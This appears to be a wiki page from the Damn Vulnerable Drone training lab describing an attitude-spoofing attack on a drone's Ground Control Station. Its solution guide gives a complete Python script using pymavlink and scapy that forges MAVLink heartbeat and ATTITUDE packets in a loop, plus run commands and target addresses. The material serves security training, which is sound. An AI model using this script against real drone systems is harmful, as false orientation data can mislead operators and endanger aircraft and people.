<i>Spoofing the drone's attitude data to mislead the Ground Control Station (GCS) about the drone's orientation and movements.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > Attitude Spoofing

# Description

Attitude spoofing involves sending false attitude data (pitch, roll, yaw) to the Ground Control Station (GCS) to mislead it about the drone's actual orientation and movements. This can cause the operator to make incorrect decisions based on the spoofed data.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<p>Install required libraries:</p>

<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>attitude-spoofing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_attitude():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.attitude_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        roll=random.uniform(-1.0, 1.0),
        pitch=random.uniform(-1.0, 1.0),
        yaw=random.uniform(-3.14, 3.14),
        rollspeed=random.uniform(-0.1, 0.1),
        pitchspeed=random.uniform(-0.1, 0.1),
        yawspeed=random.uniform(-0.1, 0.1)
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python attitude-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_attitude(), target_ip, target_port)
        print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<p>Execute the script using:</p>

<pre><code class="code mb-3 mt-3">sudo python3 attitude-spoofing.py 10.13.0.6:14550</code></pre>

<p>Replace <code>10.13.0.6:14550</code> with the actual GCS IP and port. For example:</p>
<ul>
  <li><code>10.13.0.6:14550</code> – QGroundControl</li>
  <li><code>192.168.13.14:14550</code> – MAVProxy over Wi-Fi</li>
  <li><code>10.13.0.4:14550</code> – MAVProxy over bridge</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Watch the GCS interface (e.g., QGroundControl) and verify that spoofed attitude values (pitch, roll, yaw) are reflected. The drone orientation will appear incorrect relative to its actual flight state.</p>

</details>
